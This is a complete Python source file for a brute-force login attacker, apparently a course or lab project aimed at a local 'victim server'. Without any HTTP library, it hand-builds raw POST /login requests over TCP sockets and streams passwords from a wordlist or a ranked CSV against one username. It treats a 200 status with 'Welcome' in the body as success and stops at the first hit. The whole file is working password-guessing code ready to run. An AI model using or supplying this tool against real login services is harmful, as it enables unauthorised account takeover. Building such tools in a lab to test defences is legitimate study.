"""
attack_tool.py — custom brute-force attacker (raw sockets only).

Part 2 of the project. This tool performs online password-guessing attacks
against the victim server's POST /login endpoint.

HARD CONSTRAINT: no high-level HTTP libraries. Every HTTP request is built by
hand as a byte string and sent over a raw TCP socket (the `socket` module).
The only imports are the standard library `socket`, `argparse`, `sys`, `time`.

Currently implemented mode:
  * dictionary : try many passwords against ONE username, stop on first success.

Usage:
  python attack_tool.py --target 127.0.0.1 --port 8080 --mode dictionary \
      --username admin --wordlist wordlist.txt
  # for a rank,password CSV (like 10millionPasswords.csv) add --csv:
  python attack_tool.py --target 127.0.0.1 --mode dictionary \
      --username admin --wordlist 10millionPasswords.csv --csv
"""

import argparse
import socket
import sys
import time

# --- Configuration -----------------------------------------------------------

SOCKET_TIMEOUT = 5.0  # seconds; keeps a hung server from freezing the attack
RECV_CHUNK = 4096     # bytes to read per recv() call


# --- 1. url_encode -----------------------------------------------------------

# Characters that are safe to send unescaped in a form body. Everything else is
# percent-encoded as %XX. RFC 3986 "unreserved" set: letters, digits, - _ . ~
_UNRESERVED = set(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "-_.~"
)


def url_encode(value: str) -> str:
    """
    Percent-encode a string for an application/x-www-form-urlencoded body.

    Reserved/unsafe characters (@, &, =, space, +, %, etc.) become %XX using
    their UTF-8 byte values, so the body never breaks the username/password
    boundaries. Implemented by hand — no urllib.
    """
    encoded_chars = []
    for byte in value.encode("utf-8"):
        char = chr(byte)
        if char in _UNRESERVED:
            encoded_chars.append(char)
        else:
            encoded_chars.append("%%%02X" % byte)
    return "".join(encoded_chars)


# --- 2. craft_packet ---------------------------------------------------------

def craft_packet(host: str, username: str, password: str) -> bytes:
    """
    Build a raw HTTP POST /login request as bytes.

    Content-Length is computed as the EXACT byte length of the encoded body,
    which is what makes the server read the body correctly.
    """
    body = "username=%s&password=%s" % (url_encode(username), url_encode(password))
    body_bytes = body.encode("utf-8")

    # Headers, joined with CRLF. A blank line separates headers from the body.
    request_lines = [
        "POST /login HTTP/1.1",
        "Host: %s" % host,
        "User-Agent: Mozilla/5.0",
        "Content-Type: application/x-www-form-urlencoded",
        "Content-Length: %d" % len(body_bytes),
        "Connection: close",
        "",
        "",  # trailing empty -> the blank line that ends the headers
    ]
    header_bytes = "\r\n".join(request_lines).encode("utf-8")
    return header_bytes + body_bytes


# --- 3. send_packet ----------------------------------------------------------

def send_packet(target: str, port: int, raw_bytes: bytes) -> str:
    """
    Send raw_bytes over a fresh TCP socket and return the full response text.

    Uses Connection: close semantics — we read until the server closes the
    connection (recv returns b""). Raises socket.error / OSError on failure,
    which the caller handles per-attempt.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(SOCKET_TIMEOUT)
    try:
        sock.connect((target, port))
        sock.sendall(raw_bytes)

        chunks = []
        while True:
            data = sock.recv(RECV_CHUNK)
            if not data:
                break
            chunks.append(data)
        return b"".join(chunks).decode("utf-8", errors="replace")
    finally:
        sock.close()


# --- 4. parse_response -------------------------------------------------------

def parse_response(response: str) -> bool:
    """
    Return True only on a clear success signal.

    Success = status line contains '200' AND the body contains 'Welcome'.
    A 401 / 'Invalid' response is treated as failure. An empty or malformed
    response is also failure.
    """
    if not response:
        return False

    # The status line is the first line, e.g. "HTTP/1.1 200 OK".
    status_line = response.split("\r\n", 1)[0]
    status_ok = " 200 " in status_line or status_line.endswith(" 200")

    # The body follows the first blank line (CRLFCRLF).
    parts = response.split("\r\n\r\n", 1)
    body = parts[1] if len(parts) > 1 else ""
    body_ok = "Welcome" in body

    return status_ok and body_ok


# --- 5. log_result -----------------------------------------------------------

def log_result(username: str, password: str, success: bool) -> None:
    """Print one line describing an attempt to stdout."""
    tag = "[+]" if success else "[-]"
    outcome = "SUCCESS" if success else "FAIL"
    print("%s %s : %-20s -> %s" % (tag, username, password, outcome))


# --- Wordlist reading --------------------------------------------------------

def iter_wordlist(path: str, is_csv: bool):
    """
    Yield candidate passwords from the wordlist file, one at a time (streaming).

    Streaming means we never load the whole file into memory and we can stop the
    moment we find a hit.

    Plain mode : each line is one password.
    CSV mode   : each line is 'rank,password'; skip the header row and take
                 everything after the FIRST comma (so passwords with commas work).
    """
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        first = True
        for line in f:
            line = line.rstrip("\n").rstrip("\r")
            if is_csv:
                if first:
                    first = False
                    # Skip a header like "rank,password".
                    if line.lower().startswith("rank,"):
                        continue
                if "," not in line:
                    continue
                password = line.split(",", 1)[1]
            else:
                password = line
            if password == "":
                continue
            yield password


# --- Dictionary attack -------------------------------------------------------

def dictionary_attack(target, port, host_header, username, wordlist_path, is_csv):
    """
    Try each password in the wordlist against a single username.

    Stops on the first success and prints a summary.
    """
    print("[*] Dictionary attack on user '%s' against %s:%d" % (username, target, port))
    print("[*] Wordlist: %s%s" % (wordlist_path, " (CSV)" if is_csv else ""))
    print("-" * 60)

    attempts = 0
    found_password = None
    start = time.time()

    for password in iter_wordlist(wordlist_path, is_csv):
        attempts += 1
        packet = craft_packet(host_header, username, password)
        try:
            response = send_packet(target, port, packet)
        except (socket.timeout, OSError) as exc:
            # Connection error on this attempt — report and keep going.
            print("[!] %s : %-20s -> ERROR (%s)" % (username, password, exc))
            continue

        success = parse_response(response)
        log_result(username, password, success)

        if success:
            found_password = password
            break

    elapsed = time.time() - start

    print("-" * 60)
    if found_password is not None:
        print("[+] PASSWORD FOUND: %s : %s" % (username, found_password))
    else:
        print("[-] Password not found for '%s' (wordlist exhausted)." % username)
    print("[*] Attempts: %d | Time: %.2fs" % (attempts, elapsed))
    return found_password is not None


# --- CLI ---------------------------------------------------------------------

def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Custom raw-socket brute-force attacker (dictionary mode)."
    )
    parser.add_argument("--target", required=True, help="target IP/host")
    parser.add_argument("--port", type=int, default=8080, help="target port (default 8080)")
    parser.add_argument("--mode", required=True, choices=["dictionary"],
                        help="attack mode (only 'dictionary' implemented so far)")
    parser.add_argument("--username", help="username to attack (dictionary mode)")
    parser.add_argument("--wordlist", default="wordlist.txt",
                        help="path to the password wordlist (default wordlist.txt)")
    parser.add_argument("--csv", action="store_true",
                        help="wordlist is a 'rank,password' CSV with a header")
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)

    if args.mode == "dictionary":
        if not args.username:
            print("error: --username is required for dictionary mode", file=sys.stderr)
            return 2
        # The Host header uses the target as given; that's what the server sees.
        found = dictionary_attack(
            args.target, args.port, args.target,
            args.username, args.wordlist, args.csv,
        )
        return 0 if found else 1

    return 2


if __name__ == "__main__":
    sys.exit(main())
